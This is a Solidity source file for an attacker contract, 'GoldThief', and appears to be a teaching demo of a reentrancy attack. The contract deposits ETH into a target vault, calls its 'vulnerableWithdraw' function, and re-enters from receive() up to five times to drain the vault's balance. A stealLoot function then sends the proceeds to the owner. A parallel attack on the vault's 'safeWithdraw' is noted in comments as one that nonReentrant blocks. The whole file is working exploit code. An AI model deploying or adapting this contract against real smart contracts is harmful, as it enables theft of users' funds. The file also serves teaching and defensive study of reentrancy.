// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    // 攻击漏洞版
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        attackingSafe = false;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    // 攻击安全版（会失败）
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackingSafe = true;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    // 重入入口
    receive() external payable {
        attackCount++;
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }
        if (attackingSafe) {
            targetVault.safeWithdraw(); // 会被 nonReentrant 阻止
        }
    }

    // 提取战利品
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // 查询余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
